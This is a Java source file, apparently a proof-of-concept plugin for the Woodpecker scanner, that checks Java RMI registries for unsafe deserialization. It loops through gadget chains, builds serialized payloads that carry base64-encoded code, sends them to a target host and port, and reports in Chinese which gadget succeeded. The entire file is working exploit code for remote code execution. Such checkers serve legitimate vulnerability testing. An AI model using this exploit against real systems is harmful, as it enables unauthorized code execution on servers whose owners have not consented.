package me.gv7.woodpecker.plugin.poc;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.CommonUtil;
import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;
import sun.misc.BASE64Encoder;
import java.util.List;
import java.util.Map;

import static me.gv7.woodpecker.plugin.JavaRMIVulPlugin.gadgets;

public class RmiDeserialPoc implements IPoc {
    @Override
    public IScanResult doVerify(ITarget target, IResultOutput resultOutput) {
        String host = target.getHost();
        int port = target.getPort();

        IScanResult scanResult = JavaRMIVulPlugin.pluginHelper.createScanResult();
        scanResult.setTarget(target.getAddress());
        String msg = "";
        for(String gadget:gadgets){
            String bcelStr = CommonUtil.getVerifyCode("x");
            bcelStr = new BASE64Encoder().encode(bcelStr.getBytes());
            String result = null;
            try{
                Object objPayload = CommonUtil.generator(gadget,String.format("codebase64:%s",bcelStr));
                if(objPayload == null){
                    continue;
                }
                result = RMIRegistryExploit.sendPayload(host,port,objPayload);
            } catch (Throwable e) {
                System.out.println("erro: " + gadget);
                e.printStackTrace();
            }

            if(result != null){
                msg += String.format("[+] %s:%d存在漏洞！返回信息：%s, 可用gadget:%s\n",host,port,result,gadget);
                scanResult.setExists(true);
                scanResult.setMsg(msg);
            }else{
                msg += String.format("[-] %s:%d gadget:%s不可用\n",host,port,result,gadget);
            }
        }
        return scanResult;
    }
}
